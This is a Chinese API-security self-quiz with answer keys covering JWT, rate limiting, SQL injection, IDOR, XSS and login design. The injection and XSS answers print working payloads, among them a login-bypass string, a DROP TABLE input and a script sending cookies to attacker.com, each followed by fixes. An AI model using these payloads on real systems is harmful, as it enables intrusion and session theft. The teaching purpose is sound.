# API 安全 - 自测题

完成文档学习和代码示例后，通过以下题目检验学习效果。

**总分：100分**

---

## 一、概念理解（选择题，每题8分，共32分）

### 1. 认证（Authentication）和鉴权（Authorization）的区别是什么？

A. 认证是验证密码，鉴权是验证用户名  
B. 认证是验证用户身份，鉴权是验证用户权限  
C. 认证用于前端，鉴权用于后端  
D. 两者是同一个概念，只是叫法不同  

<details>
<summary>查看答案</summary>

**答案**：B

**解析**：
- **认证（Authentication）**：验证"你是谁"，确认用户身份（如登录验证）→ 失败返回 401 Unauthorized
- **鉴权（Authorization）**：验证"你能做什么"，确认用户权限（如检查是否有删除权限）→ 失败返回 403 Forbidden

**记忆方法**：
- Authentication = 认证 = 身份证检查
- Authorization = 授权 = 权限检查

</details>

---

### 2. 为什么不应该在JWT的Payload中存储敏感信息（如密码、信用卡号）？

A. JWT的Payload是加密的，但加密算法不够强  
B. JWT的Payload只是Base64编码，任何人都能解码查看  
C. JWT的Payload有大小限制，放不下敏感信息  
D. JWT的Payload会被浏览器缓存，容易泄露  

<details>
<summary>查看答案</summary>

**答案**：B

**解析**：

JWT的结构：`Header.Payload.Signature`

- **Header和Payload**：只是Base64编码，**不是加密**！
- 任何人都可以解码查看内容：
  ```javascript
  const payload = "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0";
  const decoded = atob(payload);  // 轻松解码
  ```

- **Signature**：用于验证Token没有被篡改，但不保护Payload的机密性

**正确做法**：
- JWT中只存储非敏感信息：userId、username、role、exp
- 敏感信息存储在服务器，通过userId查询

</details>

---

### 3. 以下哪种限流算法最能平滑流量，避免临界点问题？

A. 固定窗口  
B. 滑动窗口  
C. 令牌桶  
D. 漏桶  

<details>
<summary>查看答案</summary>

**答案**：B

**解析**：

**固定窗口的临界点问题**：
```
00:59 发送100次（允许）
01:00 窗口重置
01:01 发送100次（允许）
→ 2秒内发送200次！
```

**滑动窗口**：
- 统计任意时间窗口内的请求数（如最近60秒）
- 窗口不断滑动，无临界点问题
- 平滑限流

**令牌桶和漏桶**：
- 令牌桶：允许突发流量（适合秒杀）
- 漏桶：强制平滑流量（适合需要严格限速的场景）

**对比**：
- 如果目标是"平滑流量、避免突刺"，滑动窗口最合适
- 如果需要"允许突发 + 平均限速"，选令牌桶
- 如果需要"强制平滑、绝对限速"，选漏桶

</details>

---

### 4. 以下哪个HTTP状态码应该用于"请求过于频繁，触发限流"的场景？

A. 403 Forbidden  
B. 429 Too Many Requests  
C. 503 Service Unavailable  
D. 500 Internal Server Error  

<details>
<summary>查看答案</summary>

**答案**：B

**解析**：

**429 Too Many Requests**：专门用于限流场景

响应示例：
```
HTTP/1.1 429 Too Many Requests
Retry-After: 60
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1626239082

{
  "code": 42900,
  "message": "请求过于频繁，请60秒后重试"
}
```

**其他状态码**：
- **403 Forbidden**：有权限问题（如普通用户访问管理员接口）
- **503 Service Unavailable**：服务不可用（如系统维护）
- **500 Internal Server Error**：服务器内部错误

</details>

---

## 二、威胁识别（判断分析题，每题12分，共36分）

### 5. 识别SQL注入漏洞

**场景**：用户登录功能

```java
@PostMapping("/login")
public User login(@RequestParam String username, @RequestParam String password) {
    String sql = "SELECT * FROM users WHERE username = '" + username + 
                 "' AND password = '" + password + "'";
    return jdbcTemplate.queryForObject(sql, User.class);
}
```

**问题**：
1. 这段代码存在什么安全漏洞？
2. 攻击者如何利用这个漏洞？
3. 如何修复？

<details>
<summary>参考答案</summary>

**1. 漏洞：SQL注入**

直接拼接用户输入到SQL语句中，没有做任何转义或验证。

**2. 攻击方式**：

```
攻击者输入：
username = admin' OR '1'='1
password = anything

实际执行的SQL：
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'

结果：
OR '1'='1' 永远为真，绕过密码验证，成功登录！

更严重的攻击：
username = admin'; DROP TABLE users; --
→ 删除整个users表
```

**3. 修复方法**：

**方法1：参数化查询（推荐）**
```java
@PostMapping("/login")
public User login(@RequestParam String username, @RequestParam String password) {
    String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
    return jdbcTemplate.queryForObject(sql, User.class, username, password);
}
```

**方法2：使用ORM（如JPA）**
```java
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    User findByUsernameAndPassword(String username, String password);
}
```

**方法3：输入验证（辅助措施）**
```java
// 验证用户名格式
if (!username.matches("^[a-zA-Z0-9_]{3,20}$")) {
    throw new ValidationException("用户名格式不正确");
}
```

**核心原则**：永远不要拼接用户输入到SQL中！

</details>

---

### 6. 识别IDOR（不安全的直接对象引用）漏洞

**场景**：查询用户订单

```java
@GetMapping("/users/{userId}/orders")
public List<Order> getUserOrders(@PathVariable Long userId) {
    return orderRepository.findByUserId(userId);
}
```

当前登录用户ID：123

**问题**：
1. 这段代码存在什么安全问题？
2. 攻击者可以做什么？
3. 如何修复？

<details>
<summary>参考答案</summary>

**1. 安全问题：IDOR（越权访问）**

代码只检查了用户是否登录，但没有检查userId是否属于当前用户。

**2. 攻击方式**：

```
攻击者（用户123）可以：
GET /users/124/orders  → 查看用户124的订单
GET /users/125/orders  → 查看用户125的订单
...

遍历所有用户ID，窃取所有订单信息！
```

**3. 修复方法**：

```java
@GetMapping("/users/{userId}/orders")
public List<Order> getUserOrders(
    @PathVariable Long userId,
    @AuthenticationPrincipal User currentUser  // 从Token/Session解析
) {
    // 检查：当前用户是否是userId本人（或管理员）
    if (!currentUser.getId().equals(userId) && !currentUser.isAdmin()) {
        throw new ForbiddenException("无权访问其他用户的订单");
    }
    
    return orderRepository.findByUserId(userId);
}
```

**更安全的设计**：

```java
// 方案1：直接从Token获取用户ID，不信任URL参数
@GetMapping("/my/orders")
public List<Order> getMyOrders(@AuthenticationPrincipal User currentUser) {
    return orderRepository.findByUserId(currentUser.getId());
}

// 方案2：在Service层检查权限
@Service
public class OrderService {
    public List<Order> getUserOrders(Long userId, Long currentUserId) {
        if (!userId.equals(currentUserId)) {
            throw new ForbiddenException("无权访问");
        }
        return orderRepository.findByUserId(userId);
    }
}
```

**核心原则**：
- 不要信任URL中的用户ID
- 每次访问资源前检查归属关系
- 使用从Token/Session解析的用户ID

</details>

---

### 7. 识别XSS漏洞

**场景**：博客评论功能

```java
@PostMapping("/comments")
public Comment createComment(@RequestBody CommentDTO dto) {
    Comment comment = new Comment();
    comment.setContent(dto.getContent());  // 直接保存用户输入
    return commentRepository.save(comment);
}
```

前端渲染：
```html
<div id="comment-list">
  <div th:each="comment : ${comments}">
    <p th:utext="${comment.content}"></p>  <!-- th:utext = 不转义 -->
  </div>
</div>
```

**问题**：
1. 这段代码存在什么安全问题？
2. 攻击者如何利用？
3. 如何修复？

<details>
<summary>参考答案</summary>

**1. 安全问题：XSS（跨站脚本攻击）**

用户输入的内容未经转义直接输出到HTML中，恶意脚本会被执行。

**2. 攻击方式**：

```
攻击者提交评论：
<script>
  // 窃取Cookie
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

或：
<img src="x" onerror="alert('XSS攻击')">

其他用户访问这个页面时：
→ 脚本执行
→ Cookie被发送到攻击者服务器
→ 攻击者获取用户的Session，可以冒充用户
```

**3. 修复方法**：

**方法1：HTML转义（输出时）**
```html
<!-- 使用 th:text 而不是 th:utext -->
<p th:text="${comment.content}"></p>

结果：
<script>alert('xss')</script>
→ 转义为：
&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
→ 显示为文本，不会执行
```

**方法2：Java代码转义**
```java
public String escapeHtml(String input) {
    return input
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("\"", "&quot;")
        .replace("'", "&#x27;");
}

@PostMapping("/comments")
public Comment createComment(@RequestBody CommentDTO dto) {
    Comment comment = new Comment();
    comment.setContent(escapeHtml(dto.getContent()));  // 转义
    return commentRepository.save(comment);
}
```

**方法3：Content-Security-Policy**
```java
response.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'"
);
// 禁止内联脚本和外部脚本
```

**方法4：HttpOnly Cookie**
```java
cookie.setHttpOnly(true);
// 即使有XSS漏洞，JavaScript也无法访问Cookie
```

**核心原则**：
- 输出到HTML时必须转义
- 使用CSP限制脚本来源
- Cookie设置HttpOnly
- 永远不要相信用户输入

</details>

---

## 三、方案设计（综合题，每题16分，共32分）

### 8. 设计一个安全的登录认证方案

**需求**：
- 用户通过用户名密码登录
- 登录成功返回Token
- Token用于后续API调用
- 防止暴力破解
- 支持Token刷新

**任务**：
1. 选择认证方式（JWT、Session等），并说明理由
2. 设计登录流程（包括密码验证、Token生成）
3. 设计防暴力破解机制
4. 设计Token刷新机制

<details>
<summary>参考答案</summary>

**1. 认证方式选择：JWT**

**理由**：
- 无状态，易于横向扩展
- 适合前后端分离、移动端
- 跨域友好

**2. 登录流程**：

```java
@PostMapping("/login")
public LoginResponse login(@RequestBody LoginRequest request) {
    String username = request.getUsername();
    String password = request.getPassword();
    
    // 1. 检查登录失败次数（防暴力破解）
    int failedAttempts = loginAttemptService.getFailedAttempts(username);
    if (failedAttempts >= 5) {
        throw new TooManyAttemptsException("账户已锁定15分钟");
    }
    
    // 2. 查询用户
    User user = userRepository.findByUsername(username);
    if (user == null) {
        loginAttemptService.recordFailedAttempt(username);
        throw new BadCredentialsException("用户名或密码错误");
    }
    
    // 3. 验证密码（bcrypt）
    if (!passwordEncoder.matches(password, user.getPassword())) {
        loginAttemptService.recordFailedAttempt(username);
        throw new BadCredentialsException("用户名或密码错误");
    }
    
    // 4. 登录成功，清除失败记录
    loginAttemptService.clearFailedAttempts(username);
    
    // 5. 生成Token
    String accessToken = jwtService.generateAccessToken(user);   // 15分钟
    String refreshToken = jwtService.generateRefreshToken(user); // 7天
    
    // 6. 返回Token
    return LoginResponse.builder()
        .accessToken(accessToken)
        .refreshToken(refreshToken)
        .expiresIn(900)  // 15分钟 = 900秒
        .build();
}
```

**密码存储**：
```java
// 注册时
String hashedPassword = passwordEncoder.encode(plainPassword);
user.setPassword(hashedPassword);

// 登录时
boolean matches = passwordEncoder.matches(plainPassword, hashedPassword);
```

**3. 防暴力破解机制**：

```java
@Service
public class LoginAttemptService {
    private Map<String, AttemptRecord> attempts = new ConcurrentHashMap<>();
    
    public void recordFailedAttempt(String username) {
        AttemptRecord record = attempts.getOrDefault(
            username, 
            new AttemptRecord()
        );
        record.increment();
        attempts.put(username, record);
    }
    
    public int getFailedAttempts(String username) {
        AttemptRecord record = attempts.get(username);
        if (record == null) return 0;
        
        // 15分钟后自动解锁
        if (record.isExpired(15 * 60 * 1000)) {
            attempts.remove(username);
            return 0;
        }
        
        return record.getCount();
    }
    
    public void clearFailedAttempts(String username) {
        attempts.remove(username);
    }
}
```

**4. Token刷新机制**：

```java
@PostMapping("/refresh")
public RefreshResponse refresh(@RequestBody RefreshRequest request) {
    String refreshToken = request.getRefreshToken();
    
    // 1. 验证Refresh Token
    JwtPayload payload = jwtService.verifyToken(refreshToken);
    
    // 2. 检查Refresh Token是否已被使用（可选：一次性Token）
    if (tokenBlacklistService.isBlacklisted(refreshToken)) {
        throw new SecurityException("Token已失效");
    }
    
    // 3. 生成新的Access Token
    User user = new User(payload.getUserId(), payload.getUsername(), payload.getRole());
    String newAccessToken = jwtService.generateAccessToken(user);
    
    // 4. 将旧Refresh Token加入黑名单（可选）
    tokenBlacklistService.blacklist(refreshToken);
    
    // 5. 生成新的Refresh Token（可选：Refresh Token Rotation）
    String newRefreshToken = jwtService.generateRefreshToken(user);
    
    return RefreshResponse.builder()
        .accessToken(newAccessToken)
        .refreshToken(newRefreshToken)
        .expiresIn(900)
        .build();
}
```

**完整流程图**：
```
1. 登录
   → 验证用户名密码
   → 返回Access Token (15分钟) + Refresh Token (7天)

2. 访问API
   → 携带Access Token
   → Token有效 → 返回数据

3. Access Token过期
   → 返回401
   → 前端用Refresh Token刷新
   → 获取新的Access Token

4. Refresh Token过期
   → 返回401
   → 前端跳转登录页
```

**安全措施总结**：
- ✓ 密码bcrypt哈希
- ✓ 登录失败次数限制（5次/15分钟）
- ✓ JWT设置过期时间
- ✓ Refresh Token机制
- ✓ 使用HTTPS传输

</details>

---

### 9. 设计一个API限流策略

**场景**：
一个电商API系统，包含以下端点：
- `GET /products` - 商品列表
- `POST /orders` - 创建订单
- `POST /sms/send` - 发送短信验证码

**需求**：
- 不同端点有不同的限流需求
- 区分普通用户和VIP用户
- 需要防止短信接口被刷

**任务**：
1. 为每个端点设计限流规则
2. 选择合适的限流算法
3. 设计分级限流策略（普通用户 vs VIP）
4. 设计限流响应格式

<details>
<summary>参考答案</summary>

**1. 限流规则设计**：

| 端点 | 限流规则 | 理由 |
|-----|---------|------|
| `GET /products` | 100次/分钟 | 查询接口，流量大，限制宽松 |
| `POST /orders` | 10次/分钟 | 创建订单，涉及库存扣减，限制严格 |
| `POST /sms/send` | 5次/小时 | 短信有成本，严格限制防止被刷 |

**2. 算法选择**：

**推荐：滑动窗口**
- 理由：平滑限流，无临界点问题，适合大多数场景

**实现**：
```java
@RestController
public class ProductController {
    
    @GetMapping("/products")
    @RateLimit(limit = 100, window = 60)  // 100次/分钟
    public List<Product> getProducts(@AuthenticationPrincipal User user) {
        return productService.getAll();
    }
    
    @PostMapping("/orders")
    @RateLimit(limit = 10, window = 60)  // 10次/分钟
    public Order createOrder(@RequestBody OrderDTO dto, @AuthenticationPrincipal User user) {
        return orderService.create(dto);
    }
    
    @PostMapping("/sms/send")
    @RateLimit(limit = 5, window = 3600)  // 5次/小时
    public void sendSms(@RequestBody SmsDTO dto, @AuthenticationPrincipal User user) {
        smsService.send(dto);
    }
}
```

**3. 分级限流策略**：

```java
@Component
public class RateLimitInterceptor implements HandlerInterceptor {
    
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        User user = getCurrentUser(request);
        RateLimit annotation = getRateLimitAnnotation(handler);
        
        // 根据用户等级调整限制
        int limit = annotation.limit();
        if (user.isVip()) {
            limit = limit * 5;  // VIP用户：5倍限制
        } else if (user.isPremium()) {
            limit = limit * 2;  // 付费用户：2倍限制
        }
        
        // 检查限流
        boolean allowed = rateLimiter.allowRequest(
            user.getId(),
            request.getRequestURI(),
            limit,
            annotation.window()
        );
        
        if (!allowed) {
            response.setStatus(429);
            response.setHeader("Retry-After", String.valueOf(annotation.window()));
            return false;
        }
        
        return true;
    }
}
```

**具体规则**：
```
普通用户：
- GET /products: 100次/分钟
- POST /orders: 10次/分钟
- POST /sms/send: 5次/小时

VIP用户：
- GET /products: 500次/分钟
- POST /orders: 50次/分钟
- POST /sms/send: 25次/小时
```

**4. 限流响应格式**：

```java
// 成功响应（在Header中包含限流信息）
HTTP/1.1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1626239082

// 限流响应
HTTP/1.1 429 Too Many Requests
Content-Type: application/json
Retry-After: 60
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1626239082

{
  "code": 42900,
  "message": "请求过于频繁，请60秒后重试",
  "retryAfter": 60,
  "limit": 100,
  "remaining": 0,
  "resetAt": "2026-07-16T10:31:22Z"
}
```

**额外防护（短信接口）**：

```java
@PostMapping("/sms/send")
public void sendSms(@RequestBody SmsDTO dto, @AuthenticationPrincipal User user) {
    String phone = dto.getPhone();
    
    // 1. 基于用户ID限流（5次/小时）
    if (!rateLimiter.allowRequest(user.getId(), "/sms/send", 5, 3600)) {
        throw new TooManyRequestsException("每小时最多发送5次");
    }
    
    // 2. 基于手机号限流（10次/天）- 防止给同一号码狂发
    if (!rateLimiter.allowRequest("phone:" + phone, "/sms/send", 10, 86400)) {
        throw new TooManyRequestsException("该手机号今日已达上限");
    }
    
    // 3. 验证间隔（60秒内不能重复发送）
    if (smsService.hasSentRecently(phone, 60)) {
        throw new TooManyRequestsException("请60秒后再试");
    }
    
    // 发送短信
    smsService.send(phone, generateCode());
}
```

**监控告警**：
```java
// 监控指标
- 429响应数量（触发限流次数）
- 各端点的QPS
- 超限用户TOP 10

// 告警规则
- 短时间内429数量激增 → 可能遭受攻击
- 单用户频繁触发限流 → 可能是恶意用户
```

</details>

---

## 评分标准

- **选择题（32分）**：每题8分，选对得分
- **判断分析题（36分）**：
  - 题5：识别漏洞（4分）+ 攻击方式（4分）+ 修复方法（4分）
  - 题6：识别问题（4分）+ 攻击方式（4分）+ 修复方法（4分）
  - 题7：识别漏洞（4分）+ 攻击方式（4分）+ 修复方法（4分）
- **方案设计题（32分）**：
  - 题8：方式选择（4分）+ 流程设计（4分）+ 防暴力破解（4分）+ Token刷新（4分）
  - 题9：规则设计（4分）+ 算法选择（4分）+ 分级策略（4分）+ 响应格式（4分）

**及格线：60分**  
**建议目标：80分以上**

---

## 自我检测清单

完成自测后，检查以下内容：

- [ ] 我能区分认证和鉴权
- [ ] 我知道JWT的结构和工作原理
- [ ] 我理解为什么不能在JWT中存敏感信息
- [ ] 我能识别SQL注入漏洞并知道如何防护
- [ ] 我能识别XSS漏洞并知道如何防护
- [ ] 我能识别IDOR漏洞并知道如何防护
- [ ] 我知道密码应该如何存储（bcrypt加盐哈希）
- [ ] 我理解限流的必要性和常见算法
- [ ] 我能设计一个完整的登录认证方案
- [ ] 我能为API设计合理的限流策略

**如果以上10项都能做到，恭喜你已经掌握了API安全的核心知识！** 🎉

---

💡 **下一步**：填写 `note_template.md`，用自己的话总结学到的知识，并完成 easySay 环节。

**推荐实践**：
1. 用Spring Security + JWT实现一个完整的认证系统
2. 实现一个限流中间件
3. 用OWASP ZAP扫描自己的API，检查安全漏洞
4. 阅读OWASP API Security Top 10完整文档
